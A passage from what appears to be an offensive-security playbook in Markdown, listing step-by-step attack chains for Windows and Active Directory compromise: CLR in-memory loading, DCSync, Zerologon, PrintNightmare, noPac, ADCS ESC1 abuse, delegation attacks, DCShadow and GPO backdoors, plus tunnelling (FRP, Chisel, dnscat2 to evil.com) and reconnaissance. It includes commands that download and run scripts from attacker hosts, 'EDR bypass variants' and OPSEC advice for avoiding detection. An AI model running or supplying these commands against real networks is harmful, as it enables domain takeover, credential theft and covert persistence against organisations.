C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
```

**3. Regsvcs/Regasm**  _[windows]_
_Regsvcs/Regasm_
```
regsvcs.exe malicious.dll
regasm.exe malicious.dll
Executes a .NET assembly
```

**4. Rundll32**  _[windows]_
_Rundll32 execution_
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
rundll32.exe shell32.dll,Control_RunDLL malicious.cpl
```

---

### CLR Injection  `evasion-clr-injection`
CLR in-memory injection technique
Subclass: **CLR Injection** · tags: `evasion` `clr` `injection`

**Preconditions:** Windows system; .NET environment

**Attack chain:**

**1. CLR in-memory loading**  _[windows]_
_CLR loading principle_
```
Use the CLR interface to load a .NET assembly:
1. Obtain the CLR runtime
2. Create an AppDomain
3. Load the assembly
4. Execute the entry point
```

**2. C# implementation**  _[windows]_
_C# CLR loading_
```
var clr = new ClrModule();
clr.LoadAssembly(File.ReadAllBytes("malicious.exe"));
clr.Execute("Main");
Execute the .NET program from memory
```

**3. Cobalt Strike**  _[windows]_
_Cobalt Strike implementation_
```
beacon> execute-assembly /path/to/tool.exe args
Execute the .NET assembly from memory
No disk write
```

---

## Domain Penetration Attacks

### Domain Privilege Escalation Path  `domain-privilege-escalation`
Exploit ACL misconfigurations for domain privilege escalation
Subclass: **Privilege Escalation** · tags: `acl` `privilege` `active-directory` `escalation`

**Preconditions:** Domain environment; regular domain user credentials; BloodHound analysis results

**Attack chain:**

**1. BloodHound analysis**
_Query the shortest path to Domain Admins_
```
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
```

**2. Find WriteDACL**  _[windows]_
_Find WriteDACL permission_
```
Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}
```

**3. Exploit WriteDACL**  _[windows]_
_Add DCSync permission_
```
Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER
```

**4. Execute DCSync**  _[windows]_
_Execute DCSync to obtain domain admin hashes_
```
mimikatz.exe "lsadump::dcsync /domain:domain.com /user:Administrator" "exit"
```

**5. Find GenericAll**  _[windows]_
_Find GenericAll permission_
```
Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}
```

**6. Reset password**  _[windows]_
_Reset the target user's password_
```
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
```

**EDR bypass variants:**

**1. Stealthy operation**
_Specify a domain controller for the operation_
```
Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER -DomainController dc.domain.com
```

**Analysis:** ACL misconfigurations within a domain are a common privilege escalation path, discoverable via BloodHound.

**OPSEC:** ACL modifications generate logs; prefer stealthier permissions; BloodHound can reveal the attack path

---

### Cross-Domain Trust Attack  `domain-cross-trust`
Exploit domain trust relationships for cross-domain attacks
Subclass: **Cross-Domain Attack** · tags: `trust` `cross-domain` `active-directory` `forest`

**Preconditions:** Source domain access already obtained; a domain trust relationship exists; target domain information

**Attack chain:**

**1. Enumerate trust relationships**  _[windows]_
_Enumerate domain trust relationships_
```
Get-NetDomainTrust
```

**2. Enumerate forest trusts**  _[windows]_
_Enumerate forest trust relationships_
```
Get-NetForestTrust
```

**3. Cross-domain user enumeration**  _[windows]_
_Enumerate target domain users_
```
Get-NetUser -Domain target.domain.com
```

**4. Cross-domain group enumeration**  _[windows]_
_Enumerate target domain groups_
```
Get-NetGroup -Domain target.domain.com
```

**5. SID History attack**  _[windows]_
_Use SID History for cross-domain privilege escalation_
```
mimikatz.exe "kerberos::golden /domain:source.domain.com /sid:S-1-5-21-SOURCE /sids:S-1-5-21-TARGET-519 /krbtgt:HASH /user:Administrator /ptt" "exit"
```

**6. Cross-domain ticket**  _[windows]_
_Request a target domain ticket_
```
asktgt.exe -domain target.domain.com -user Administrator -hash :HASH
```

**EDR bypass variants:**

**1. Stealthy cross-domain**
_Specify the target domain controller for enumeration_
```
Get-NetUser -Domain target.domain.com -DomainController dc.target.domain.com
```

**Analysis:** Cross-domain trust attacks can exploit trust relationships to move from a lower-security domain to a higher-security domain.

**OPSEC:** Cross-domain attacks generate logs; SID History requires special privileges; forest trust is safer

---

### Zerologon Attack  `zerologon`
CVE-2020-1472 Netlogon privilege escalation
Subclass: **Zerologon** · tags: `zerologon` `cve-2020-1472` `domain`

**Preconditions:** Access to the domain controller RPC

**Attack chain:**

**1. Detect the vulnerability**  _[linux]_
_Detect the vulnerability_
```
python zerologon_tester.py DC_NAME DC_IP
Check whether the vulnerability exists
```

**2. Exploit the vulnerability**  _[linux]_
_Exploit the vulnerability_
```
python zerologon_exploit.py DC_NAME DC_IP
Set the DC's password to empty
```

**3. Dump hashes**  _[linux]_
_Dump hashes_
```
secretsdump.py -just-dc -no-pass DOMAIN/DC_NAME$@DC_IP
Dump all hashes in the domain
```

**4. Restore the password**  _[linux]_
_Restore the password_
```
python zerologon_restore.py DC_NAME DC_IP ORIGINAL_NTLM
Restore the DC password to avoid causing damage
```

---

### PrintNightmare Attack  `printnightmare`
CVE-2021-34527 print spooler service vulnerability
Subclass: **PrintNightmare** · tags: `printnightmare` `cve-2021-34527` `rce`

**Preconditions:** Access to the print spooler service RPC

**Attack chain:**

**1. Detect the vulnerability**  _[linux]_
_Detect the print spooler service_
```
rpcdump.py @DC_IP | grep MS-RPRN
Check whether the print spooler service is available
```

**2. Exploit the vulnerability**  _[linux]_
_Exploit the vulnerability_
```
python CVE-2021-34527.py -target DC_IP -payload DLL_PATH
Load a malicious DLL to obtain SYSTEM privileges
```

**3. Impacket exploitation**  _[linux]_
_Use Impacket_
```
python dementor.py -d domain -u user -p pass \\attacker\share DC_IP
Trigger loading of a remote DLL
```

---

### PetitPotam Attack  `petitpotam`
CVE-2021-36942 forced authentication attack
Subclass: **PetitPotam** · tags: `petitpotam` `cve-2021-36942` `relay`

**Preconditions:** Access to the EFSRPC interface

**Attack chain:**

**1. Start the relay**  _[linux]_
_Start the NTLM relay_
```
python ntlmrelayx.py -t ldap://DC_IP -smb2support --adcs
Set up an NTLM relay to ADCS
```

**2. Trigger authentication**  _[linux]_
_Trigger authentication_
```
python petitpotam.py -d domain -u user -p pass attacker_ip DC_IP
Force the DC to authenticate to the attacker
```

**3. Obtain the certificate**  _[linux]_
_Obtain the certificate_
```
After a successful relay, obtain the user's certificate
Use the certificate for Pass-the-Cert
```

---

### noPac/SAMAccountName Attack  `samaccountname`
CVE-2021-42278/CVE-2021-42287 domain privilege escalation
Subclass: **noPac** · tags: `nopac` `cve-2021-42278` `privesc`

**Preconditions:** Regular domain user privileges

**Attack chain:**

**1. Detect the vulnerability**  _[linux]_
_Detect the vulnerability_
```
python noPac.py domain/user:password -dc-ip DC_IP -debug
Check whether the vulnerability exists
```

**2. Exploit the vulnerability**  _[linux]_
_Exploit the vulnerability_
```
python noPac.py domain/user:password -dc-ip DC_IP -dc-host DC_NAME -shell
Obtain domain admin privileges
```

**3. Attack principle**
_Attack principle_
```
1. Create a machine account (with a name similar to a DC)
2. Clear the SPN
3. Request a TGT
4. Delete the machine account
5. Obtain a domain admin TGT
```

---

### ADCS Abuse Attack  `adcs-abuse`
Active Directory Certificate Services abuse
Subclass: **ADCS** · tags: `adcs` `certificate` `domain`

**Preconditions:** ADCS service is accessible

**Attack chain:**

**1. Enumerate ADCS**  _[linux]_
_Enumerate the ADCS configuration_
```
certipy find -u user@domain -p password -dc-ip DC_IP
Enumerate certificate templates
```

**2. Request a user certificate**  _[linux]_
_Request a certificate_
```
certipy req -u user@domain -p password -ca CA_NAME -template User
Request a user certificate
```

**3. Pass-the-Cert**  _[linux]_
_Authenticate with the certificate_
```
certipy auth -pfx user.pfx -dc-ip DC_IP
Use the certificate to obtain a TGT
```

**4. Rubeus request**  _[windows]_
_Rubeus exploitation_
```
Rubeus.exe asktgt /user:target /certificate:cert.pfx /ptt
Use Rubeus to request a TGT
```

---

### ADCS ESC1 Vulnerability  `adcs-esc1`
Certificate template ESC1 abuse
Subclass: **ADCS** · tags: `adcs` `esc1` `certificate`

**Preconditions:** A template with ESC1 configuration exists

**Attack chain:**

**1. Identify ESC1**  _[linux]_
_Identify the vulnerable template_
```
certipy find -u user@domain -p password -vulnerable
Find the ESC1-vulnerable template
```

**2. Exploit ESC1**  _[linux]_
_Request a domain admin certificate_
```
certipy req -u user@domain -p password -ca CA_NAME -template ESC1_TEMPLATE -alt admin@domain
Specify the SAN as the domain admin
```

**3. Authenticate as domain admin**  _[linux]_
_Authenticate as domain admin_
```
certipy auth -pfx admin.pfx -dc-ip DC_IP
Use the certificate to authenticate as domain admin
```

---

### Constrained Delegation Attack  `constrained-delegation`
Exploit constrained delegation for lateral movement
Subclass: **Delegation Attack** · tags: `delegation` `constrained` `kerberos`

**Preconditions:** An account with constrained delegation configured exists

**Attack chain:**

**1. Find constrained delegation**  _[windows]_
_Find accounts with constrained delegation_
```
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation
or
a BloodHound query
```

**2. Obtain a service ticket**  _[windows]_
_S4U2Self + S4U2Proxy_
```
Rubeus.exe s4u /user:SERVICE_ACCOUNT$ /rc4:HASH /msdsspn:CIFS/target.domain.com /impersonateuser:Administrator
Obtain a service ticket for the domain admin
```

**3. Use the ticket**  _[windows]_
_Inject the ticket_
```
Rubeus.exe ptt /ticket:BASE64_TICKET
Inject the ticket and access the service
```

---

### Resource-Based Constrained Delegation  `resource-delegation`
Exploit RBCD for privilege escalation
Subclass: **Delegation Attack** · tags: `rbcd` `delegation` `kerberos`

**Preconditions:** WriteDACL permission on the target object

**Attack chain:**

**1. Create a machine account**  _[windows]_
_Create a machine account_
```
New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString "password" -AsPlainText -Force)
Create a new machine account
```

**2. Configure RBCD**  _[windows]_
_Configure RBCD_
```
Set-ADComputer -Identity TARGET_COMPUTER -PrincipalsAllowedToDelegateToAccount FAKECOMPUTER$
Set up the delegation relationship
```

**3. Exploit RBCD**  _[windows]_
_Exploit RBCD_
```
Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:HASH /impersonateuser:Administrator /msdsspn:CIFS/target.domain.com
Obtain a domain admin ticket
```

---

### DCShadow Attack  `dcshadow-attack`
Impersonate a domain controller to inject data
Subclass: **DCShadow** · tags: `dcshadow` `domain` `injection`

**Preconditions:** Domain admin privileges; ability to register a new DC

**Attack chain:**

**1. Register a fake DC**  _[windows]_
_Register a fake DC_
```
mimikatz # lsadump::dcshadow /object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519
Register a fake DC and modify the object attribute
```

**2. Push the changes**  _[windows]_
_Push the changes_
```
In another terminal:
mimikatz # lsadump::dcshadow /push
Push the changes to the real DC
```

**3. Common exploitation**  _[windows]_
_Common exploitation scenarios_
```
Modify a user's group:
/object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519
Add SID History:
/attribute:sidHistory /value:S-1-5-21-xxx-500
```

---

### Group Policy Abuse  `group-policy-abuse`
Abuse Group Policy for lateral movement
Subclass: **Group Policy** · tags: `gpo` `group-policy` `domain`

**Preconditions:** GPO edit permission

**Attack chain:**

**1. Find editable GPOs**  _[windows]_
_Find editable GPOs_
```
Get-GPO -All | Where-Object { $_ | Get-GPPermission -TargetType User -TargetName "Domain Users" -PermissionLevel GpoEdit }
Find GPOs editable by Domain Users
```

**2. Add a scheduled task**  _[windows]_
_Add a scheduled task_
```
New-GPOImmediateTask -TaskName "Backdoor" -Command "cmd.exe" -Arguments "/c calc.exe" -GPODisplayName "VULN_GPO"
Add a scheduled task that runs immediately
```

**3. Add a registry entry**  _[windows]_
_Add a registry startup entry_
```
Set-GPPrefRegistryValue -Name "VULN_GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Backdoor" -Value "C:\backdoor.exe"
```

---

### SAM The Admin Attack  `sam-the-admin`
CVE-2021-42278/CVE-2021-42287 domain privilege escalation
Subclass: **SAM The Admin** · tags: `ad` `cve-2021-42278` `privilege`

**Preconditions:** Domain user privileges, domain controller vulnerable

**Attack chain:**

**1. Detect vulnerability**  _[linux]_
_Detect vulnerability_
```
python noPac.py domain.com/user:password -dc-ip DC_IP
Check whether the vulnerability exists
```

**2. Exploit vulnerability**  _[linux]_
_Obtain domain controller privileges_
```
python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -shell
Obtain a SYSTEM shell
```

**3. Run a command**  _[linux]_
_Execute command_
```
python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -command "whoami"
```

---

### NoAuth Attack  `noauth`
CVE-2022-33679 Kerberos authentication bypass
Subclass: **NoAuth** · tags: `ad` `cve-2022-33679` `kerberos`

**Preconditions:** Domain user privileges, target account has an RC4 key

**Attack chain:**

**1. Detect vulnerability**  _[linux]_
_Detect vulnerability_
```
python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator
Check whether the vulnerability exists
```

**2. Exploit vulnerability**  _[linux]_
_Obtain TGT_
```
python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator
Obtain the target user's TGT
```

**3. Use the TGT**  _[linux]_
_Use the obtained TGT_
```
Set the KRB5CCNAME environment variable
export KRB5CCNAME=administrator.ccache
Use tools such as psexec.py
```

---

## Tunnels and Proxies

### FRP Internal Network Tunneling  `tunnel-frp`
Use FRP to establish an internal network tunnel
Subclass: **TCP Tunnel** · tags: `frp` `tunnel` `proxy` `nat`

**Preconditions:** Public server, internal machine can reach the public internet, FRP tool

**Attack chain:**

**1. Server configuration**  _[linux]_
_FRP server configuration file frps.ini_
```
[common]
bind_port = 7000
```

**2. Client configuration**  _[windows]_
_FRP client configuration file frpc.ini_
```
[common]
server_addr = attacker_ip
server_port = 7000

[rdp]
type = tcp
local_ip = 127.0.0.1
local_port = 3389
remote_port = 3389
```

**3. Start the server**  _[linux]_
_Start the FRP server_
```
./frps -c frps.ini
```

**4. Start the client**  _[windows]_
_Start the FRP client_
```
frpc.exe -c frpc.ini
```

**Analysis:** FRP can establish a TCP tunnel that maps internal network services to the public internet.

**OPSEC:** FRP traffic may be detected, consider using encrypted transport, be mindful of process hiding

---

### Chisel Internal Network Tunneling  `tunnel-chisel`
Use Chisel to establish an internal network tunnel
Subclass: **HTTP Tunnel** · tags: `chisel` `tunnel` `proxy` `http`

**Preconditions:** Public server, internal machine can reach the public internet, Chisel tool

**Attack chain:**

**1. Server**  _[linux]_
_Start the Chisel server_
```
./chisel server -p 8000 --reverse
```

**2. Reverse SOCKS**  _[windows]_
_Establish a reverse SOCKS proxy_
```
chisel.exe client attacker_ip:8000 R:socks
```

**3. Port forwarding**  _[windows]_
_Port forwarding_
```
chisel.exe client attacker_ip:8000 R:3389:127.0.0.1:3389
```

**Analysis:** Chisel can establish an HTTP tunnel to bypass firewalls.

**OPSEC:** Chisel uses the HTTP protocol, can be disguised by binding a domain name, traffic is encrypted

---

### ReGeorg Tunnel  `tunnel-regeorg`
Establish a tunnel through a web shell
Subclass: **ReGeorg** · tags: `tunnel` `regeorg` `proxy`

**Preconditions:** Web shell uploaded, scripting language supported

**Attack chain:**

**1. Upload the tunnel script**
_Upload the tunnel script for the corresponding language_
```
Upload tunnel.aspx/tunnel.jsp/tunnel.php to the target web server
```

**2. Establish tunnel**  _[linux]_
_Start SOCKS proxy_
```
python reGeorgSocksProxy.py -p 1080 -u http://target/tunnel.aspx
```

**3. Configure proxy**  _[linux]_
_Scan through the proxy_
```
proxychains nmap -sT -Pn target
```

---

### SSH Local Forwarding  `tunnel-ssh-local`
SSH local port forwarding
Subclass: **SSH** · tags: `ssh` `tunnel` `local`

**Preconditions:** SSH access

**Attack chain:**

**1. Local forwarding**  _[linux]_
_Map the target's port 80 to local port 8080_
```
ssh -L 8080:target:80 user@jump
```

---

### SSH Remote Forwarding  `tunnel-ssh-remote`
SSH remote port forwarding
Subclass: **SSH** · tags: `ssh` `tunnel` `remote`

**Preconditions:** SSH access

**Attack chain:**

**1. Remote forwarding**  _[linux]_
_Map local port 80 to remote port 8080_
```
ssh -R 8080:localhost:80 user@jump
```

---

### SSH Dynamic Forwarding  `tunnel-ssh-dynamic`
SSH dynamic SOCKS proxy
Subclass: **SSH** · tags: `ssh` `tunnel` `socks`

**Preconditions:** SSH access

**Attack chain:**

**1. Dynamic forwarding**  _[linux]_
_Create a SOCKS proxy_
```
ssh -D 1080 user@jump
```

**2. Use the proxy**  _[linux]_
_Access through the SOCKS proxy_
```
proxychains nmap -sT -Pn target
```

---

### DNS Tunnel  `tunnel-dns`
Establish a tunnel over the DNS protocol
Subclass: **DNS** · tags: `dns` `tunnel` `covert`

**Preconditions:** DNS resolution privileges, controllable domain name

**Attack chain:**

**1. Use dnscat2**  _[linux]_
_Start the dnscat2 server_
```
ruby dnscat2.rb evil.com --dns port=53,domain=evil.com
```

**2. Client connection**  _[windows]_
_Client connects to the server_
```
dnscat2-v0.07-client-win32.exe --dns domain=evil.com --secret SECRET
```

**3. Establish tunnel**  _[linux]_
_Establish a SOCKS tunnel_
```
session -i 1
listen 127.0.0.1:1080 10.0.0.1:1080
```

---

### ICMP Tunnel  `tunnel-icmp`
Establish a tunnel over the ICMP protocol
Subclass: **ICMP** · tags: `icmp` `tunnel` `covert`

**Preconditions:** ICMP allowed through, administrator privileges

**Attack chain:**

**1. Use icmptunnel**  _[linux]_
_Start the server side_
```
icmptunnel -s 10.0.0.1
```

**2. Client connection**  _[linux]_
_Client connects_
```
icmptunnel -c attacker.com
```

---

### Ligolo Tunnel  `tunnel-ligolo`
Ligolo internal network tunneling tool
Subclass: **Ligolo** · tags: `ligolo` `tunnel` `proxy`

**Preconditions:** Proxy program executable

**Attack chain:**

**1. Start the server**  _[linux]_
_Start the Ligolo proxy service_
```
sudo proxy -selfcert
```

**2. Run the proxy**  _[windows]_
_Run the proxy on the target machine_
```
agent.exe -connect attacker:11601 -ignore-cert
```

**3. Create tunnel**  _[linux]_
_Create the tunnel interface_
```
session
start
```

---

### SOCKS Proxy  `socks-proxy`
Establish a SOCKS proxy to access the internal network
Subclass: **SOCKS** · tags: `socks` `proxy` `tunnel`

**Preconditions:** Existing internal network access point

**Attack chain:**

**1. SSH SOCKS proxy**  _[linux]_
_SSH dynamic port forwarding_
```
ssh -D 1080 user@jumpserver
or
ssh -D 1080 -N -f user@jumpserver
```

**2. ProxyChains configuration**  _[linux]_
_Configure ProxyChains_
```
Edit /etc/proxychains.conf:
[ProxyList]
socks5 127.0.0.1 1080

Use:
proxychains nmap -sT target
```

**3. Cobalt Strike SOCKS**  _[windows]_
_CS SOCKS proxy_
```
beacon> socks 1080
Start the SOCKS proxy in CS
```

**4. Metasploit SOCKS**  _[linux]_
_MSF SOCKS proxy_
```
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run
```

---

### Ngrok Internal Network Tunneling  `tunnel-ngrok`
Use Ngrok to establish an internal network tunnel
Subclass: **Ngrok** · tags: `ngrok` `tunnel` `penetration`

**Preconditions:** Ngrok account, external network access

**Attack chain:**

**1. Install Ngrok**
_Install and configure Ngrok_
```
Download: https://ngrok.com/download
tar -xvzf ngrok.zip
./ngrok authtoken YOUR_TOKEN
```

**2. HTTP tunnel**
_Create an HTTP tunnel_
```
./ngrok http 80
Map local port 80 to the public internet
```

**3. TCP tunnel**
_Create a TCP tunnel_
```
./ngrok tcp 3389
Map local port 3389 to the public internet
```

**4. Custom domain**
_Use a custom domain_
```
./ngrok http -hostname=custom.domain.com 80
```

---

### EW Internal Network Tunneling  `tunnel-ew`
Use EW to establish an internal network tunnel
Subclass: **EW** · tags: `ew` `tunnel` `socks`

**Preconditions:** Existing internal network access point

**Attack chain:**

**1. Forward proxy**  _[linux]_
_Forward SOCKS proxy_
```
./ew -s ssocksd -l 1080
Start the SOCKS proxy on the pivot host
```

**2. Reverse proxy**  _[linux]_
_Reverse SOCKS proxy_
```
Attacker machine: ./ew -s rcsocks -l 1080 -e 8888
Pivot host: ./ew -s rssocks -d attacker_ip -e 8888
```

**3. Multi-hop chaining**  _[linux]_
_Multi-hop chaining_
```
./ew -s lcx_tran -l 1080 -f 2nd_hop -g 9999
Multi-hop pivot tunneling
```

---

### Venom Internal Network Tunneling  `tunnel-venom`
Use Venom to establish an internal network tunnel
Subclass: **Venom** · tags: `venom` `tunnel` `socks`

**Preconditions:** Existing internal network access point

**Attack chain:**

**1. Start the server**  _[linux]_
_Start the server_
```
./venom_server -lport 9999
Start the server on the attacker machine
```

**2. Connect the client**
_Connect to the server_
```
./venom_client -rhost attacker_ip -rport 9999
Connect to the server from the pivot host
```

**3. Establish SOCKS**
_Establish a SOCKS proxy_
```
Venom > socks 1080
Establish a SOCKS proxy
```

**4. Port forwarding**
_Port forwarding_
```
Venom > lforward 127.0.0.1 3389 13389
Forward internal network port 3389 to local port 13389
```

---

## Information Gathering

### BloodHound Domain Analysis  `bloodhound-enumeration`
Use BloodHound to analyze Active Directory attack paths
Subclass: **Domain Analysis** · tags: `bloodhound` `active-directory` `enumeration` `neo4j`

**Preconditions:** domain environment; domain user credentials; BloodHound tool

**Attack chain:**

**1. SharpHound Collection**  _[windows]_
_Use SharpHound to collect domain information_
```
SharpHound.exe -c All
```

**2. PowerShell Collection**  _[windows]_
_Remotely load and collect via PowerShell_
```
IEX(New-Object Net.WebClient).DownloadString("http://attacker/SharpHound.ps1"); Invoke-BloodHound -CollectionMethod All
```

**3. bloodhound-python**  _[linux]_
_Use the Python version to collect_
```
bloodhound-python -u user -p password -d target.com -ns dc_ip
```

**4. Specify Domain Controller**  _[windows]_
_Collect against a specified domain controller_
```
SharpHound.exe -c All --LdapUsername user --LdapPassword pass --DomainController dc.target.com
```

**5. Start Neo4j**  _[linux]_
_Start the Neo4j database_
```
sudo neo4j console
```

**6. Cypher Query for Domain Admins**
_Query domain admin users_
```
MATCH (n:User) WHERE n.admincount=true RETURN n
```

**7. Query Attack Paths**
_Query the shortest path to domain admin_
```
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
```

**EDR bypass variants:**

**1. Stealth Collection**
_Randomize the filename to avoid detection_
```
SharpHound.exe -c All --LdapUsername user --LdapPassword pass --OutputDirectory C:\Users\Public --RandomizeFilenames
```

**Analysis:** BloodHound can uncover attack paths within the domain, such as privilege escalation paths, session information, and group relationships.

**OPSEC:** BloodHound collection generates a large volume of LDAP queries; it may trigger domain controller alerts; recommended to run outside business hours

---

### SPN Scan  `spn-scan`
Scan for Service Principal Names within the domain
Subclass: **SPN** · tags: `spn` `kerberos` `enumeration`

**Preconditions:** a domain environment; any domain user credential

**Attack chain:**

**1. Query All SPNs**  _[windows]_
_Query every SPN in the domain_
```
setspn -T domain.com -Q */*
```

**2. PowerShell Query**  _[windows]_
_Query SPN accounts via PowerShell_
```
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
```

**3. Impacket Query**  _[linux]_
_Query SPNs via Impacket_
```
GetUserSPNs.py domain/user:password -dc-ip dc_ip
```

**4. Query a Specific Service**  _[windows]_
_Query the SPN of the HTTP service_
```
setspn -T domain.com -Q HTTP/*
```

**5. Find SQL Services**  _[windows]_
_Query the SPN of the MSSQL service_
```
setspn -T domain.com -Q MSSQLSvc/*
```

**Analysis:** SPN scanning can reveal service accounts running within the domain, preparing the ground for a Kerberoasting attack.

**OPSEC:** SPN queries are normal domain operations; they will not trigger obvious alerts; can be used to prepare for subsequent Kerberoasting attacks

---

### Internal Network Port Scan  `port-scan`
Internal network port scanning and service identification
Subclass: **Port Scan** · tags: `nmap` `port-scan` `enumeration`

**Preconditions:** internal network access; scanning tools

**Attack chain:**

**1. Quick Scan**  _[linux]_
_Quickly scan common ports_
```
nmap -sS -T4 -F 192.168.1.0/24
```

**2. Full Port Scan**  _[linux]_
_Scan all 65535 ports_
```
nmap -sS -p- 192.168.1.1
```

**3. Service Identification**  _[linux]_
_Service version detection and script scanning_
```
nmap -sV -sC 192.168.1.1
```

**4. Internal Host Discovery**  _[linux]_
_Ping scan to discover live hosts_
```
nmap -sn 192.168.1.0/24
```

**5. Masscan Fast Scan**  _[linux]_
_High-speed port scanning_
```
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

**6. Operating System Identification**  _[linux]_
_Identify the target operating system_
```
nmap -O 192.168.1.1
```

**7. UDP Scan**  _[linux]_
_Scan common UDP ports_
```
nmap -sU --top-ports 20 192.168.1.1
```

**8. Vulnerability Scan**  _[linux]_
_Use vulnerability scanning scripts_
```
nmap --script vuln 192.168.1.1
```

**EDR bypass variants:**

**1. Stealth Scan**
_Low-speed fragmented scan with random data padding_
```
nmap -sS -T2 -f --data-length 50 192.168.1.1
```

**2. Decoy Scan**
_Use decoy IPs to obscure the scan source_
```
nmap -sS -D RND:10 192.168.1.1
```

**Analysis:** Port scanning can reveal services open on the internal network and identify potential attack targets.

**OPSEC:** High-speed scanning may trigger IDS alerts; recommended to use a lower rate; spread the scan across multiple time windows

---

### Domain Information Gathering  `domain-recon`
Active Directory domain environment information gathering
Subclass: **Domain Information** · tags: `active-directory` `domain` `enumeration`

**Preconditions:** a domain environment; any domain user credential

**Attack chain:**

**1. Domain Information**  _[windows]_
_Get domain information_
```
net config workstation
```

**2. Domain Controller**  _[windows]_
_List domain controllers_
```
nltest /dclist:domain.com
```

**3. Domain Users**  _[windows]_
_List domain users_
```
net user /domain
```

**4. Domain Admins**  _[windows]_
_List the Domain Admins group_
```
net group "Domain Admins" /domain
```

**5. Domain Trust Relationships**  _[windows]_
_List domain trust relationships_
```
nltest /domain_trusts
```

**6. PowerView Collection**  _[windows]_
_Use PowerView to gather domain information_
```
IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerView.ps1"); Get-NetDomain
```

**7. Get Domain Policy**  _[windows]_
_Get the domain password policy_
```
Get-DomainPolicy
```

**8. Get Domain Controller**  _[windows]_
_Get domain controller information_
```
Get-NetDomainController
```

**Analysis:** Domain information gathering is the foundation of internal network penetration, revealing the domain structure, users, groups, and more.

**OPSEC:** Domain information gathering is a normal operation; it will not trigger obvious alerts; it prepares the ground for subsequent attacks

---

### Network Information Gathering  `network-recon`
Internal network topology and configuration information gathering
Subclass: **Network Information** · tags: `network` `enumeration` `topology`

**Preconditions:** internal network access

**Attack chain:**

**1. Network Configuration**  _[windows]_
_View network configuration_
```
ipconfig /all
```

**2. Routing Table**  _[windows]_
_View the routing table_
```
route print
```

**3. ARP Cache**  _[windows]_
_View the ARP cache_
```
arp -a
```

**4. Network Connections**  _[windows]_
_View network connections_
```
netstat -ano
```

**5. DNS Cache**  _[windows]_
_View the DNS cache_
```
ipconfig /displaydns
```

**6. Linux Network Configuration**  _[linux]_
_View network configuration on Linux_
```
ifconfig -a
```

**7. Linux Routing Table**  _[linux]_
_View the routing table on Linux_
```
route -n
```

**8. traceroute**  _[windows]_
_Trace the route_
```
tracert target_ip
```

**Analysis:** Network information gathering reveals internal network topology, subnet segmentation, gateway information, and more.

**OPSEC:** These are normal network management commands; they will not trigger alerts; they prepare the ground for subsequent lateral movement

---

### Share Enumeration  `share-enum`
Enumerate network share resources
Subclass: **Shares** · tags: `smb` `share` `enumeration`

**Preconditions:** internal network access

**Attack chain:**

**1. Enumerate Shares**  _[windows]_
_View local shares_
```
net share
```

**2. View Remote Shares**  _[windows]_
_View shares on a remote machine_
```
net view \\target_ip
```

**3. SMBMap Enumeration**  _[linux]_
_Enumerate shares with SMBMap_
```
smbmap -H target_ip -u user -p password
```

**4. CrackMapExec Enumeration**  _[linux]_
_Enumerate shares with CME_
```
crackmapexec smb target_ip -u user -p password --shares
```

**5. smbclient Enumeration**  _[linux]_
_Enumerate with smbclient_
```
smbclient -L target_ip -U user%password
```

**6. PowerView Enumeration**  _[windows]_
_Find interesting shared files_
```
Find-InterestingDomainShareFile
```

**Analysis:** Share enumeration can uncover sensitive files, configuration files, backup files, and other valuable information.

**OPSEC:** Share enumeration is a normal operation; it may surface sensitive files; be mindful of file access logs

---

### User Enumeration  `user-enum`
Enumerate domain user information
Subclass: **Users** · tags: `user` `enumeration` `active-directory`

**Preconditions:** a domain environment; any domain user credential

**Attack chain:**

**1. List Domain Users**  _[windows]_
_List all domain users_
```
net user /domain
```

**2. User Details**  _[windows]_
_View detailed user information_
```
net user username /domain
```

**3. PowerView Enumeration**  _[windows]_
_Enumerate users with PowerView_
```
Get-NetUser | select samaccountname,description,admincount
```

**4. Find Admins**  _[windows]_
_Find domain admins_
```
Get-NetUser -AdminCount | select samaccountname
```

**5. Find Active Users**  _[windows]_
_Find recently logged-in users_
```
Get-NetUser | Where-Object {$_.lastlogon -gt (Get-Date).AddDays(-30)}
```

**6. Impacket Enumeration**  _[linux]_
_Enumerate domain users with Impacket_
```
GetADUsers.py -all domain/user:password -dc-ip dc_ip
```

**Analysis:** User enumeration can uncover high-value targets, active users, service accounts, and more.

**OPSEC:** User enumeration is a normal operation; used to select targets for subsequent attacks; watch for honeypot accounts

---

### Group Enumeration  `group-enum`
Enumerate domain group information
Subclass: **Groups** · tags: `group` `enumeration` `active-directory`

**Preconditions:** a domain environment; any domain user credential

**Attack chain:**

**1. List Domain Groups**  _[windows]_
_List all domain groups_
```
net group /domain
```

**2. Group Members**  _[windows]_
_View Domain Admins group members_
```
net group "Domain Admins" /domain
```

**3. PowerView Enumeration**  _[windows]_
_Enumerate groups with PowerView_
```
Get-NetGroup | select samaccountname,admincount
```

**4. Find Privileged Groups**  _[windows]_
_Find privileged groups_
